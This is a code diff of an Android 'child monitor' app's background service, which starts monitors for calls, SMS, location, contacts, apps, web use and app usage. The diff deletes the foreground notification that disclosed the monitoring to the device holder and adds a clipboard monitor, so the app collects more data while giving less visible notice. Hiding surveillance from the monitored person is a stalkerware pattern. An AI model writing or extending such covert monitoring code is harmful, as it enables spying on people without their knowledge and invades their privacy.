@@ -1,6 +1,5 @@
 package com.childmonitorai;
 
-import android.accessibilityservice.AccessibilityService;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -9,7 +8,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.IBinder;
-import android.provider.Settings;
 import android.text.TextUtils;
 import android.util.Log;
 
@@ -17,6 +15,7 @@ import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 
 import com.google.firebase.auth.FirebaseAuth;
+
 public class MonitoringService extends Service {
     private static final String TAG = "MonitoringService";
     private static final String CHANNEL_ID = "MonitoringServiceChannel";
@@ -56,15 +55,7 @@ public class MonitoringService extends Service {
     }
 
     private void startMonitoringService() {
-        // Start foreground service with notification
-        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Child Monitoring Service")
-                .setContentText("Monitoring calls, SMS, and location in the background.")
-                .setSmallIcon(R.drawable.ic_launcher_foreground)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
-                .build();
-
-        startForeground(1, notification);
+        Log.d(TAG, "Starting monitoring service");
 
         try {
             FirebaseAuth auth = FirebaseAuth.getInstance();
@@ -77,14 +68,14 @@ public class MonitoringService extends Service {
             String userId = auth.getCurrentUser().getUid();
             String phoneModel = android.os.Build.MODEL;
 
-            // Add null checks before starting monitors
-            if (userId == null || userId.isEmpty()) {
+            // Null checks
+            if (TextUtils.isEmpty(userId)) {
                 Log.e(TAG, "User ID is null or empty.");
                 stopSelf();
                 return;
             }
 
-            if (phoneModel == null || phoneModel.isEmpty()) {
+            if (TextUtils.isEmpty(phoneModel)) {
                 Log.e(TAG, "Phone model is null or empty.");
                 stopSelf();
                 return;
@@ -98,21 +89,27 @@ public class MonitoringService extends Service {
             startContactMonitor(userId, phoneModel);
             startAppMonitor(userId, phoneModel);
             startWebMonitor(userId, phoneModel);
+            startAppUsageMonitor(userId, phoneModel);
+            startClipboardMonitor(userId, phoneModel); // Added Clipboard Monitor
 
         } catch (Exception e) {
             Log.e(TAG, "Error starting monitors: " + e.getMessage());
         }
     }
 
+    private void startClipboardMonitor(String userId, String phoneModel) {
+        Log.d(TAG, "Initializing Clipboard Monitor");
+        ClipboardMonitor clipboardMonitor = new ClipboardMonitor(this, userId, phoneModel);
+        clipboardMonitor.startMonitoring(); // Start monitoring clipboard content
+    }
+
     private void startWebMonitor(String userId, String phoneModel) {
         Log.d(TAG, "Initializing Web Monitor");
 
-        // Initialize the WebMonitor service
-        Intent serviceIntent = new Intent(this, WebMonitor.class); // Use 'this' if inside Activity or Service
+        Intent serviceIntent = new Intent(this, WebMonitor.class);
         serviceIntent.putExtra("userId", userId);
         serviceIntent.putExtra("phoneModel", phoneModel);
 
-        // Start the service
         startService(serviceIntent);
     }
 
@@ -152,16 +149,13 @@ public class MonitoringService extends Service {
         appMonitor.startMonitoring();
     }
 
-
     private void startAppUsageMonitor(String userId, String phoneModel) {
         Log.d(TAG, "Initializing App Usage Monitor");
 
-        // Initialize the AppUsageMonitor service
-        Intent serviceIntent = new Intent(this, AppUsageService.class); // Use 'this' if inside Activity or Service
+        Intent serviceIntent = new Intent(this, AppUsageService.class);
         serviceIntent.putExtra("userId", userId);
         serviceIntent.putExtra("phoneModel", phoneModel);
 
-        // Start the service
         startService(serviceIntent);
     }
 
@@ -182,26 +176,8 @@ public class MonitoringService extends Service {
     }
 
     private void showPermissionActivity() {
-        // Start PermissionActivity to request necessary permissions
         Intent intent = new Intent(this, PermissionActivity.class);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
-    }
-
-    // Method to check if Accessibility Service is enabled
-    private boolean isAccessibilityServiceEnabled(Class<? extends AccessibilityService> serviceClass) {
-        String service = getPackageName() + "/" + serviceClass.getName();
-        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
-        splitter.setString(Settings.Secure.getString(
-                getContentResolver(),
-                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES));
-
-        while (splitter.hasNext()) {
-            String enabledService = splitter.next();
-            if (enabledService.equalsIgnoreCase(service)) {
-                return true;
-            }
-        }
-        return false;
     }
 }
